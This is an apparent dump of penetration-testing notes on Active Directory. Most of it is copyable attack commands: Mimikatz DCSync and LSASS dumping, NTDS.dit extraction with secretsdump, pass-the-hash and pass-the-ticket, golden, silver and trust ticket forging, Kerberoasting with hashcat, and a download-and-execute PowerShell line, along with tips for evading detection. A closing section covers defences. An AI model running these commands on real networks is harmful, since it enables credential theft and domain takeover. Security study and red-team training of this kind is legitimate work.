https://blog.stealthbits.com/discovering-service-accounts-without-using-privileges https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting https://blog.stealthbits.com/impersonating-service-accounts-with-silver-tickets https://blog.stealthbits.com/complete-domain-compromise-with-golden-tickets/ https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a https://blog.stealthbits.com/performing-domain-reconnaissance-using-powershell https://blog.stealthbits.com/local-admin-mapping-bloodhound https://blog.stealthbits.com/extracting-password-hashes-from-the-ntds-dit-file/ https://blog.stealthbits.com/passing-the-hash-with-mimikatz https://blog.stealthbits.com/what-is-dcsync-an-introduction/ https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/ https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/ https://blog.ropnop.com/practical-usage-of-ntlm-hashes/ https://blog.ropnop.com/extracting-hashes-and-domain-info-from-ntds-dit/ https://blog.ropnop.com/using-credentials-to-own-windows-boxes/ https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/ https://0xdarkvortex.dev/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/ https://0xdarkvortex.dev/index.php/2018/08/26/active-directory-penetration-dojo-setup-of-ad-penetration-labpart-2/ https://0xdarkvortex.dev/index.php/2018/10/29/active-directory-penetration-dojo-creation-of-forest-trustpart-3/ https://www.attackdebris.com/?p=470 https://blog.didierstevens.com/2016/08/12/mimikatz-golden-ticket-dcsync/ https://adsecurity.org/?p=2362 https://pentestlab.blog/tag/ntds-dit/ http://www.harmj0y.net/blog/penetesting/pass-the-hash-is-dead-long-live-pass-the-hash/ http://passing-the-hash.blogspot.com/ http://blog.liatsisfotis.com/knock-and-pass-kerberos-exploitation.html https://room362.com/post/2017/reset-ad-user-password-with-linux/ https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a TR19: I'm in your cloud, reading everyone's emails - hacking Azure AD via Active Directory: https://www.youtube.com/watch?v=JEIR5oGCwdg Azure AD Connect for Red Teamers: https://blog.xpnsec.com/azuread-connect-for-redteam/ https://github.com/hausec/PowerZure How Attackers Pull the Active Directory Database (NTDS.dit) from a Domain Controller: https://adsecurity.org/?p=451 Attack Methods for Gaining Domain Admin Rights in Active Directory: https://adsecurity.org/?p=2362 Mimikatz DCSync Usage, Exploitation, and Detection: https://adsecurity.org/?p=1729 How Attackers Dump Active Directory Database Credentials: https://adsecurity.org/?p=2398","title":"Active Directory"},{"location":"windows/active-directory/#active-directory","text":"","title":"Active Directory"},{"location":"windows/active-directory/#quick-references","text":"https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet Active Directory Kill Chain Attack Defense Active Directory Penetration Testing Checklist: https://gbhackers.com/active-directory-penetration-testing-checklist/?fbclid=IwAR0sd1LYx9O-w8PCXuQDO7NZHDe8YnJC0aJllppl6Jr0nf9gGWZ8qoTaKc8 https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc780036(v=ws.10 ) Introduction Active Directory enables centralized, secure management of an entire network, which might span a building, a city, or multiple locations throughout the world. These antiquated AD designs only focused on the: Directory information tree Delegation model Group Policy Objects (GPOs) structure and accounts management Securing privileged access - Active Directory administrative tier model: https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material Kerberos v5 used from Windows Server 2000+ Naming conventions User Principal name: winsaafman @scriptdotsh . local DN (Distinguished Names) LDAP names: CN = winsaafman , DC = corp , DC = scriptdotsh , DC = local CN = Common name OU = Organisational Unit DC = Domain Components Schema - Defines objects and attributes Query and index mechanism - Ability to search and publish objects and properties Global Catalog - Contains info about every object in directory Replication Service - Distributes information across domain controller Structure Forest - Security boundary, which may contain multiple domains and each domain may contain multiple OU s https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759186(v%3dws.10) https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759073(v%3dws.10) Organizational Units Container object Used to arrange other objects Easier to locate and manage Can delegate the authority to manage Can be nested in other organizational units Domains Container object Collection of administratively defined objects that share a common directory database, security policies, and trust relationships with other domains Each domain is an administrative boundary for objects. A single domain can span multiple physical locations or sites Domain Trees Collections of domains that are grouped together in hierarchical structures When you add a domain to a tree, it becomes a child of the tree root domain The domain to which a child domain is attached is called the parent domain. A child domain might in turn have its own child domain. The name of a child domain is combined with the name of its parent domain to form its own unique Domain Name System (DNS) name such as Corp.nwtraders.msft. .:. a tree has a contiguous namespace. Forests Instance of Active Directory Each forest acts as a top-level container in that it houses all domain containers for that particular Active Directory instance A forest can contain one or more domain container objects, all of which share a common logical structure, global catalog, directory schema, and directory configuration, as well as automatic two-way transitive trust relationships. The first domain in the forest is called the forest root domain . The name of that domain refers to the forest, such as Nwtraders.msft. By default, information in Active Directory is shared only within the forest. .:. the forest is a security boundary for the information that is contained in that instance of Active Directory Site Objects Leaf and container objects Topmost object in the hierarchy of objects that are used to manage and implement Active Directory replication Stores the hierarchy of objects that are used by the Knowledge Consistency Checker ( KCC ) to effect the replication topology Some of the objects located in: NTDS Site Settings objects , subnet objects , connection objects , server objects , and site objects (one site object for each site in the forest) Hierarchy is displayed as the contents of the Sites container, which is a child of the Configuration container SYSVOL Ref: https://social.technet.microsoft.com/wiki/contents/articles/24160.active-directory-back-to-basics-sysvol.aspx Folder which resides on each and every domain controller within the domain . Contains the domains public files that need to be accessed by clients and kept synchronised between domain controllers. Default location is C : \\ Windows \\ SYSVOL The SYSVOL folder can be accessed through: share \\\\ domainname . com \\ sysvol or the local share name on the server \\\\ servername \\ sysvol . Uses DFS to share the relevant folders to users and clients. - Distributed File System. Client and server services that allow servers to organize distributed file shares into a distributed file system. File Replication Service - FRS is a multi-master, multi-threaded replication technology. Introduced in Windows 2000 to replace the previous LMREPL technology used in NT3.x and 4 days Ageing Cache - Detects the change by monitoring the NTFS USN journal (stored in NTFRS database) (every 3 seconds) Replaced by DFSR (Distributed File System Replication) in Windows 2008 or higher Auto-healing functions in place to remedy some of the issues that FRS Instead of replicating entire files we only replicate the chunks of data that have changed Based on MD4 hash of the file The log contains information about the file and the time it was changed , this is then used to build its change message . To ensure the file and all it \u2019 s attributes ( i . e . permissions ) are kept intact FRS calls the backup [ API ] ( http : // social . technet . microsoft . com / wiki / contents / articles / 20580 . wiki - glossary - of - technology - acronyms . aspx # API ) which uses [ VSS ] ( http : // social . technet . microsoft . com / wiki / contents / articles / 20580 . wiki - glossary - of - technology - acronyms . aspx # VSS ) technology to take a snapshot of the file and it \u2019 s attributes . This backup file is then compressed and stored in the staging area folder . At this point the outbound log is updated ( again this is actually a table within the FRS database ) . This contains information about all the changes for a specified replication set . If in step 1 a file was deleted rather than created then we don \u2019 t create a staging file , but the outbound log reflects the deletion . FRS on DC1 then sends a change notification to its replication partner DC2 . DC2 adds the information about the change into its inbound log and accepts the change then sends a change acknowledgment back to DC1 . DC2 then copies the file from DC1 into its staging area . It then writes an entry to its outbound log to allow other partners to pickup the change . DC2 then calls the backup API to restore the file from the staging area into the SYSVOL folder . So there you have it , FRS replication . There is a very detailed and in - depth reference guide on TechNet [ here ] ( http : // technet . microsoft . com / en - us / library / cc758169 ( v = WS . 10 ) . aspx ) for further reference . Detect Firewall Blocking AD https://blogs.msmvps.com/acefekay/2011/11/01/active-directory-firewall-ports-let-s-try-to-make-this-simple/ PortQryUI - http://www.microsoft.com/download/en/details.aspx?id=24009 Run the \u201cDomains Trusts\u201d option between DCs, or between DCs and any machine \u201cNOTLISTENING,\u201d 0x00000001, and 0x00000002, that means there is a port block Can ignore UDP 389 and UDP 88 messages TCP 42 errors, that just means WINS is not running on the target server","title":"Quick References"},{"location":"windows/active-directory/#ad-trust-types","text":"Ref: https://scriptdotsh.com/wp-content/uploads/2018/10/trust2.png Trust Type Property Trust Direction Auth. Details Tree-Root Transitive Two-way Kerberos V5 or NTLM Created automatically when a new Tree is added to a forest. Parent-Child Transitive Two-way Kerberos V5 or NTLM Created automatically when a child domain is added. Shortcut Transitive One-way or Two-way Kerberos V5 or NTLM Created Manually. Used in a forest to shorten the trust path to improve authentication times. Forest Transitive One-way or Two-way Kerberos V5 or NTLM Created Manually. Used to share resources between AD DS forests.","title":"AD Trust Types"},{"location":"windows/active-directory/#kerberos-process-across-trust-boundaries","text":"Ref: https://scriptdotsh.com/wp-content/uploads/2018/10/trust2.png A client from Domain 1 wants to access the server located in Domain 2. A client from Domain1 requests a TGT from the DC1. DC1 responds back with the TGT (encrypted with krbtgt hash) Client shows the TGT and requests a TGS for accessing the server in Domain2. As DC1 doesn\u2019t find the server in current domain and realizes that the TGS needs to be issued by the DC2 (of Domain2) because the server is located in the Domain2. So it responds back to client with the Inter-realm TGT. Client shows the TGT encrypted with Inter-Realm trust key to DC2 in the Domain2 and requests TGS to access the server. DC2 sends back the TGS for Server encrypted with server\u2019s account hash. Client presents the TGS (encrypted with server\u2019s account hash) to the server for access. Scope of Authentication Forest-wide authentication - Users from the outside forest have the same level of access to resources in the local forest as users who belong to the local forest. Selective authentication - You need to manually assign permissions on each computer in the domain as well as the resources to which you want users in the second forest to have access (by editing ACE (Access control entry)).","title":"Kerberos Process Across Trust Boundaries"},{"location":"windows/active-directory/#setup","text":"Install-windowsfeature AD-domain-services Install-WindowsFeature RSAT-ADDS Import-Module ADDSDeployment Install-ADDSForest -CreateDnsDelegation : $false ` -DatabasePath C:\\Windows\\NTDS ` -DomainMode Win2012R2 ` -DomainName server1.hacklab.local ` -DomainNetbiosName server1 ` -ForestMode Win2012R2 ` -InstallDns : $true ` -LogPath C:\\Windows\\NTDS ` -NoRebootOnCompletion : $false ` -SysvolPath C:\\Windows\\SYSVOL ` -Force : $true Download VMs: https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/ SysPrep When and How: https://thesolving.com/server-room/when-and-how-to-use-sysprep/ Add user net user user1 Passw0rd ! / ADD / DOMAIN New - ADUser - Name Winsaaf Man - DisplayName Winsaaf Man - SamAccountName \u201c winsaaf . man \u201d - UserPrincipalName \u201c winsaaf . man @scriptdotsh . local \u201d - GivenName \u201c winsaaf \u201d - Surname man - AccountPassword ( Read - host - AsSecureString \u201c Enter Password \u201d ) - Enabled $ true - server scriptdotsh . local More options: - ChangePasswordAtLogon $ false - PasswordNeverExpires $ true Bulk addition: https://gallery.technet.microsoft.com/office/Create-Contoso-Users-in-3e2f38f2/view/Discussions View users: net users / domain View group: net group / domain Domain Admins","title":"Setup"},{"location":"windows/active-directory/#tools","text":"","title":"Tools"},{"location":"windows/active-directory/#mimikatz","text":"Utilises the Directory Replication Service (DRS) to retrieve the password hashes from the NTDS.DIT file lsadump :: dcsync / domain : pentestlab . local / all / csv lsadump :: dcsync / domain : pentestlab . local / user : test Executing Mimikatz directly in the domain controller password hashes can be dumped via the lsass.exe process privilege :: debug lsadump :: lsa / inject","title":"Mimikatz"},{"location":"windows/active-directory/#crackmapexec","text":"Automate assessing the security of large Active Directory networks crackmapexec smb target ( s ) - u username - H LMHASH : NTHASH crackmapexec smb target ( s ) - u username - H NTHASH","title":"CrackMapExec"},{"location":"windows/active-directory/#ldapsearch","text":"Query the Domain Controller for Active Directory UserAccountControl attributes of active accounts Other specific configurations Possible UserAccountControl values: https://support.microsoft.com/en-gb/help/305144/how-to-use-the-useraccountcontrol-flags-to-manipulate-user-account-pro Active users (2 == disabled account status) ldapsearch -x -h $ip -p 389 -D SVC_TGS \u200b -w \u200b $password -b \u200b dc=active,dc=htb \u200b -s sub ( (objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))) \u200b samaccountname","title":"ldapsearch"},{"location":"windows/active-directory/#ldapdomaindump","text":"ldapdomaindump - u example \\ example 10 . 10 . 10 . 10","title":"ldapdomaindump"},{"location":"windows/active-directory/#impacket","text":"GetADUsers.py - Enumerate domain user accounts GetADUsers . py - all active . htb / svc_tgs - dc - ip $ ip","title":"Impacket"},{"location":"windows/active-directory/#enumeration","text":"Tips: Run AD enumerations on each box you get access to. Tools Automating AD Enumeration (Bloodhound, PowerUp, Responder, CrackMapExec): https://medium.com/bugbountywriteup/automating-ad-enumeration-with-frameworks-f8c7449563be Scan: pingcastle . exe --healthcheck --server DOMAIN_CONTROLLER_IP --user USERNAME --password PASSWORD --advanced-live --nullsession","title":"Enumeration"},{"location":"windows/active-directory/#using-powershell-and-built-ins","text":"Works in Constrained Mode as well. https://github.com/winsaafman/Scriptdotsh-ActiveDirectory/raw/master/Microsoft.ActiveDirectory.Management.dll C : \\ Windows \\ Microsoft . NET \\ assembly \\ GAC_64 \\ Microsoft . ActiveDirectory . Management \\ Microsoft . ActiveDirectory . Management . dll Import-Module .\\ Microsoft . ActiveDirectory . Management . dll Domain: Get - ADDomain SID: Get - DomainSID = Get - ADDomain . DomainSID . Value Domain Controller: GET - ADDomainController Users: Get - ADUser - Filter * Get - ADUser - Filter * - Properties * Get - ADUser - Server pc1 . powershell . local Get - ADUser - Identity labuser Groups : Get - ADGroup - Filter * Get - ADGroup - Filter * | Select Name Get - ADGroup - Filter { Name - like *admin* } | Select Name Filter Groups for User: Get - ADGroup - Filter { Name - like *admin* } | select name , GroupScope Group Members: Get - ADGroupMember - Identity Domain Admins - Recursive Get - AdPrincipalGroupMembership - Identity labuser Computers: Get - AdComputer - Filter * - Properties * ACL for AD objects: (without resolving GUIDs) ( Get - Acl AD:\\CN=labuser,CN=Users,DC=example,DC=powershell,DC=local ). Access Trust Get - AdTrust - Filter * Get - AdTrust - Filter * - Identify example . powershell . local Forest: Get - ADForest Get - ADForest - Identify powershell . local Get all domains in current forest: ( Get - ADForest ). Domains Forest Trust Get - ADTrust - Filter msDS-TrustForestTrustInfo -ne $null","title":"Using PowerShell and Built-ins"},{"location":"windows/active-directory/#powerview","text":". / PowerView . ps1 - Current domain information: Get - NetDomain - Domain information: Get - NetDomain - Domain powershell . local (info of domains where there is a trust relationship) - Domain Controller: Get - NetDomainController - Users: - Get - NetUser - Get - NetUser - Domain powershell . local - Get - NetUser - UserName labuser - Groups: - Get - NetGroup - Get - NetGroup * admin * - Group Members: - Get - NetGroupMembers - GroupName Domain Admins - Get - NetGroup - UserName labuser - Check if current user context has local-admin access to hosts in the domain: Find - LocalAdminAccess - Verbose - Enumerate members of local-admin groups across all machines: Invoke - EnumerateLocalAdmin - Verbose - 2016+ responded only by boxes where current user have local-admin access - Computers: Get - NetComputer - FullData - Sessions: - Get - NetSession - List sessions on a computer: Get - NetSession - ComputerName pc1 - Find computers where domain admin is logged in and current user has access: Invoke - UserHunter - CheckAccess - Based on list of machines from DC - List of sessions - Logged on users from each machine - Shares (?) - ACL for AD objects: - Get - ObjectAcl - Get - ObjectAcl - SamAccountName labuser - ResolveGUIDs - Get - ObjectACL - AdSprefix CN=Administrator,CN=Users - Verbose - Look for all interesting ACL entries: Invoke - ACLScanner - ResolveGUIDs (write modify) - Filter using IdentifyReference to identify what current user has interesting access to - Trust - Get - NetDomainTrust - Get - NetDomainTrust - Domain example . powershell . local - Forest: - Get - NetForest - Get - NetForest - Forest powershell . local - Get all domains in current forest: - Get - NetForestDomain - Get - NetForestDomain - Forest powershell . local - Forest Trust - Get - NetForestTrust - Get - NetForestTrust - Domain example . local powershell.exe -exec Bypass -C IEX (New-Object Net.WebClient).DownloadString( https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 ); Get-NetDomain","title":"PowerView"},{"location":"windows/active-directory/#snapshot-for-offline-analysis","text":"Using https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer Download: https://live.sysinternals.com/ UNC path: \\\\ live . sysinternals . com \\ tools","title":"Snapshot for Offline Analysis"},{"location":"windows/active-directory/#bloodhound","text":"Finds groups and group members of each group. Gets Domain computers in the domain. Obtain local admins for each computer. List Active sessions on each computer. And then creates relationships between all these findings.","title":"Bloodhound"},{"location":"windows/active-directory/#attack-patterns","text":"Ref: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf","title":"Attack Patterns"},{"location":"windows/active-directory/#dumping-ad-credentials","text":"secretsdump - Need domain admin credentials: secretsdump . py - just - dc - ntlm DOMAIN / USER @ DOMAIN_CONTROLLER NTDS.dit AD data stored in: %SYSTEMROOT%\\NTDS\\ntds.dit Cannot be copied directly to another location Can be extracted using Domain Controller Replication Services Native Windows Binaries WMI Backups / External Storage for DC VMWare / HyperV for virtual DCs VMWare admin can call virtual DC within VMWare Clone a DC and copy the storage file No events triggered NTDSUtil DC Promo has to copy from another DC But if NTDSUtil was used to create an IMF (Install From Media), it makes a copy of NTDS.dit Can use NTDSUtil to create an IMF or look for IMF in network Extraction techniques and tools: https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/ - Dumping Domain Password Hashes Steps: cmd.exe as Administrator ntdsutil snapshot activate instance NTDS create mount UUID copy NTDS.dit (located in Windows\\NTDS\\NTDS.dit by default) ntdsutil unmount UUID delete UUID quit quit reg.exe save HKLM\\SYSTEM path_where_you_want_to_save_it secretsdump.py -system path_to_system_hive -ntds path_to_ntds.dit LOCAL Dumping Credentials on DC - Mimikatz Take memory dump of LSASS process using task manager and use Mimikatz offline Run Mimikatz on DC Invoke-Mimikatz on DC via PS remoting Dumping Credentials on Multiple Machines - Mimikatz Invoke - Mimikatz - DumpCreds - ComputerName @ ( instance1 , instance2 ) Uses PowerShell remoting Hence need creds / administrative access to remote computers If remoting not enabled: If WIM enabled WIN32 Proess - Class Create Method (TODO:) WIN32 Service - Execute Method (TODO:)","title":"Dumping AD Credentials"},{"location":"windows/active-directory/#pass-the-hash","text":"Ref: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf In typical scenario: User type the password LSASS hash the password (LM, NTLM) and send it to service for authentication In attack scenario: Attacker pass the hash (LM, NTML) itself to LSASS which is sent to service Preventions Disable NTML hashes \"Protected Users\" group Do not leave lot of NTLM authentication footprint in eventless","title":"Pass the Hash"},{"location":"windows/active-directory/#over-pass-the-hash-pass-the-key","text":"Ref: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf If NTLM hash is available, encrypt timestamp with hash and sent it to KDC in AS-REQ to get a TGT Keys are in: Client LSASS memory Prevented by \"Protected Users\" group Active Directory NTDS.dit and SYSTEM hive Offline [Tool] NTDSXtract python DSUser . py ntds . dit . export / datatable . 4 ntds . dit . export / link_table . 7 . / work - name Administrator --syshive SYSTEM --supplcreds --passwordhashes --lmoutfile ./lm --ntoutfile ./nt --pwdformat john privilege :: debug sekurlsa :: ekeys Online privilege :: debug lsadump :: lsa / inject / name : Administrator Keys are in: DES RC4 - Non domain salted NTML hash AES128 AES256 keys (NT6+) Use PBKDF2 Salted 4096 iterations Cracking is difficult Over pass the hash privilege :: debug sekurlsa :: pth / user : Administrator / domain : DomainName / ntlm : Hash References http://www.janua.fr/active-directory-vulnerability-disclosure-weak-encryption-enables-attacker-to-change-victims-password-without-being-logged/ Mimikatz Invoke - Mimikatz - Command sekurlsa::pth /user:Administrator /domain:. /ntlm: ntlmhash /run:powershell.exe","title":"Over Pass the Hash / Pass the Key"},{"location":"windows/active-directory/#pass-the-ticket","text":"Ref: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf Inject the TGT in to the LSASS Kerberos Provider Do not ask the KDC for the TGT, instead ask the KDC to give us a TGS Can also inject TGS in to the LSASS Kerberos Provider Exporting from memory: API only allow exporting current user's tickets (your tickets) TGT: AllowTgtSessionKey reg-key must be set TGS: No restrictions http://msdn.microsoft.com/library/windows/desktop/aa378099.aspx LsaCallAuthenticationPackage / KerbRetrieveEncodedTicketMessage LsaCallAuthenticationPackage / KerbSubmitTicketMessage mimikatz kerberos :: list [ / export ] mimikatz kerberos :: ptt ticket For all users in LSASS memory: privilege :: debug sekurlsa :: tickets export kerberos : ptt ticket . kirbi","title":"Pass the Ticket"},{"location":"windows/active-directory/#token-manipulation","text":"Invoke - TokenManipulation / Incognito for impersonation Admin privileges are required to adjust token prilileges Can also use Mimikatz New process with token of given user: Invoke - TokenManipulation - ImpresonateUser - Username domain/user New process with token of another process: Invoke - TokenManupulation - CreateProcess C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe - ProcessId 500","title":"Token Manipulation"},{"location":"windows/active-directory/#dcsyc","text":"Used to sync AD to Azure Can be used to get credentials from AD If reverse encryption is enabled for an account, clear text password can be obtained. Needs Administrator or Domain Controller rights By default, no logs since this is done through official RPC (remotely) Implemented by: Mimikatz (lsadump:dcsync), Impacket, DSInternals DCSync is easy to detected","title":"DCSyc"},{"location":"windows/active-directory/#nrpc-netlogon","text":"When you have domain admin account for one DC, can as another DC to send all NTLM hashed of computer accounts and domain controller accounts. Can be used to create silver tickets. If you have rights flip some bytes of the account, can make a normal user account a workstation account. Can be used to get user accounts using this.","title":"NRPC (NetLogon)"},{"location":"windows/active-directory/#microsoft-windows-ad-kerberos-tickets","text":"Gather tickets GetUserSPNs . py - request ( HOST . DOMAIN ) / ( VALID SMB USER ):( USER PASSWORD ) Crack - a 0 - Straight cracking mode - m 13100 - Hashtype 13100 - which is Kerberos 5 TGS - REP etype 23 the kerberos . ticket file - w 3 - Suggested example workload setting for Hashcat .\\ hashcat64 . exe - m 13100 - a 0 C:\\Users\\weaknet\\Desktop\\Portfolio\\VMWare Shared\\kerberos.tick et -w 3 C :\\ Users \\ weaknet \\ Desktop \\ Portfolio \\ VMWare Shared \\ rockyou . txt hashcat ( v5 . 1 . 0 ) starting ...","title":"Microsoft Windows AD Kerberos Tickets"},{"location":"windows/active-directory/#privilege-escalation-across-domains","text":"Child to forest root Domain in same forest gave implicit two way trust with forest root There is a trust key bwterrn parent and child domains Inter - realm TGT Approaches Trust tickets Inter - realm TGT (sent along with request for TGS) to other DC is validated by Decrypting Inter - realm TGT with Trust Key If you have trust-key, you can forge trust-tickets On child domain, to get trust-key: Invoke - Mimikatz - Command lsadump::trust /patch FOrge inter-realm TGT: Invoke - Mimikatz - Command Kerberos::golden /domain:example.powershell.local /sid sid /sids: sid-history-of-enterprise-admin /rc4: rc4 /user:Administrator /service:kerbtgt /target:powershell.local /ticket:trust_tkt.kirbi Get TGS for a service using forged trust ticket: asktgs . exe trust_tht . kirbi CIFS / dc . parent . powershell . local Access kirbikator . exe lsa example . kirbi ls \\\\ dc . parent . powershell . local \\ c $ Krbtgt hash Similar to Golden Ticket Once you have kerbtgt hash of current domain, use SID history to forge a TGT: Invoke - Mimikatz - Command lsadump::lsa /patch Invoke - Mimikatz - Command Kerberos::golden /user:Adminsitator /domain:example.powershell.local /sid sid /krbtgt: hash /sids: sid-history-of-enterprise-admin /ticket:krb_tkt.kirbi On a machine in the other domain: Invoke - Mimikatz - Command kerberos:ppt krb_tkt.kirbi","title":"Privilege Escalation Across Domains"},{"location":"windows/active-directory/#persistence","text":"Golden Ticket A valud TGT signed and encrypted by the hash of krbtgt account User account validation is not done by DC (KDC service), until TGT is older than 20 minutes Can even delete / revoke accounts Krbtgt user hash could be used to impersonate any user with any privileges from even from a non-domain machine Single passwoed change has no effect on this attack (need two change operations) Why persistance technique? Once you have domain-admin, use it to extract all credentials Forge a TGT to get persistance Execute mimikatz on DC: Invoke - Mimikatz - Command lsadumo::lsa /patch - Computername ops - dc Patch the running lsa process (execute code on DC) Use DCSync to get krbtgt hash (when you have DA privilages for the domain): Invoke - Mimikatz - Command lsadump::dcsync /user:example\\krbtgt Without running code on DC On any machine: Invoke - Mimikatz - Command kerberos:golden /User:Administrator /domain:example.powershell.local /sid: domain_sid kerbtgt: hash /id:500 /group:513 /ppt Silver Ticket A valid TGS is encrypted and signed by the NTLM hash of serive account Less noisy. No communication with DC is required. Service rarely check PAC (Privileged Attribute Certificate) Services will allow access only yo the services themselves Allows access to a paticular service on a paticular machine Invoke - Mimikatz - Command kerberos:golden /domain:example.powershell.local /sid: domain_sid kerbtgt: hash /target:dc.example.powershell.local /service:cifs /rc4: rc4_of_service_account_for_cifs/machine_account /id:500 /user:Administrator /ppt","title":"Persistence"},{"location":"windows/active-directory/#defense","text":"Do not allow or limit login of DAs to any other machines (other than DC) If it's necessary, there shouldn't be any other administrators on that machine Do not run services with DA account Monitor event ID 4624: Account logon 4634: Account logoff 4672: Admin logon 4769 - A kerberos ticket was requested Kerberos Mitigations Service account passwords should be hard to guess Use managed service accounts (auto change password and deligated SPN management) Detect kerberost: 4769 and Encryption type is RC4 Service account for kerberos ticket request is a service account Securing Trust Tickets SID filtering Avoid SID history abuse (DA from child to EA on forest root) Enabled by default on all inter-forest-trusts. Intra-forest trusts are assumed to be secured by default (forest is the security boundary) SID filtering can break applications and user access (hence, usually disabled) Selective Authentication Users between the trusts will not be automatically authenticated. Individual access to domains and servers in the trusting domain/forest should be given ATA for Detecting Recon: Account enum. Netsession enum Compromised Credentials Attacks: Bruteforce, High privilege account/service account exposed in clear text, Honey token, usual protocol (NTLM and Kerberos) Credential/Hash/Ticket Replay attacks Bypassing ATA Avoid talking to the DC as long as possible Make appear the traffic we generate as attacker normal Example: Use AES keys when downgrades are detected Use unique and strong local admin account passwords Use Microsoft LAPS (Local Administrator Password Solution) to automate local admin password changes Centralized storage of passwords in AD with periodic randomizing where read permissions can be access controlled Storage in clear text, transmission is encrypted https://blog.netspi.com/running-laps-around-cleartext-passwords/ Use Privileged Adminsitratove Workstations (PAWs) Hardened workstation for performing sensitive tasks like domain administration and cloud infrastructure access Stratergies: Separate privilege and hardware for admin tasks Admin Jump servers to be accessed only from PAW Having a VM on a PAW for user tasks Administrative Tier Model Tier 0 - privileged access across the enterprise Tier 1 - access to resources with business value Tier 2 - access to resources with business value, that are hosted on user workstations and devices (Ex: Help Desk) https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material KB2871997 to disallow local account logon across the network https://technet.microsoft.com/library/security/2871997 Microsoft has definitely raised the bar: accounts that are members of the localgroup \u201cAdministrators\u201d are no longer able to execute code with WMI or PSEXEC, use schtasks or at, or even browse the open shares on the target machine. Oh, except (as pwnag3 reports and our experiences confirm) the RID 500 built-in Administrator account, even if it\u2019s renamed. Limit workstation to workstation communication Implement network segmentation Never run services with domain-admin privileged accounts on workstations (avoid dumping from LSASS) Install patch (), so that LSASS will not store plain text password Done't use unconstrained delegation (this stores user's delegated TGS in LSASS). Only use constrained delegation. Disable delegation for admin accounts (Check: Account is sensitive and cannot be delegated). Detect based on delegation events. Active Directory Core Security Principles Best Practices: https://ernw.de/download/AD_Summit_2018/01_AD_Summit_CoreSecPrinciples_fk_hw_v.1.2_signed.pdf Active Directory Kill Chain Attack Defense: https://github.com/infosecn1nja/AD-Attack-Defense Microsoft-Blue-Forest: https://github.com/rootsecdev/Microsoft-Blue-Forest Welcome to building your first domain controller!: https://github.com/rootsecdev/Microsoft-Blue-Forest/blob/master/FirstDomainControllerInstall.md Pwn and Defend - Active Directory Domain Enumeration: https://www.youtube.com/watch?v=YxeXfHkHAUI feature=youtu.be Implementing Least Privilege Model: https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/implementing-least-privilege-administrative-models Securing Privileged Access - Microsoft PS Paper - Best Practices of Securing Active Directory NetCease . ps1 to prevent session enumeration on AD computers","title":"Defense"},{"location":"windows/active-directory/#references","text":"https://adsecurity.org/ Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory: https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html Escalating privileges with ACLs in Active Directory: https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/ https://blog.stealthbits.com/discovering-service-accounts-without-using-privileges https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting https://blog.stealthbits.com/impersonating-service-accounts-with-silver-tickets https://blog.stealthbits.com/complete-domain-compromise-with-golden-tickets/ https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a https://blog.stealthbits.com/performing-domain-reconnaissance-using-powershell https://blog.stealthbits.com/local-admin-mapping-bloodhound https://blog.stealthbits.com/extracting-password-hashes-from-the-ntds-dit-file/ https://blog.stealthbits.com/passing-the-hash-with-mimikatz https://blog.stealthbits.com/what-is-dcsync-an-introduction/ https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/ https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/ https://blog.ropnop.com/practical-usage-of-ntlm-hashes/ https://blog.ropnop.com/extracting-hashes-and-domain-info-from-ntds-dit/ https://blog.ropnop.com/using-credentials-to-own-windows-boxes/ https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/ https://0xdarkvortex.dev/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/ https://0xdarkvortex.dev/index.php/2018/08/26/active-directory-penetration-dojo-setup-of-ad-penetration-labpart-2/ https://0xdarkvortex.dev/index.php/2018/10/29/active-directory-penetration-dojo-creation-of-forest-trustpart-3/ https://www.attackdebris.com/?p=470 https://blog.didierstevens.com/2016/08/12/mimikatz-golden-ticket-dcsync/ https://adsecurity.org/?p=2362 https://pentestlab.blog/tag/ntds-dit/ http://www.harmj0y.net/blog/penetesting/pass-the-hash-is-dead-long-live-pass-the-hash/ http://passing-the-hash.blogspot.com/ http://blog.liatsisfotis.com/knock-and-pass-kerberos-exploitation.html https://room362.com/post/2017/reset-ad-user-password-with-linux/ 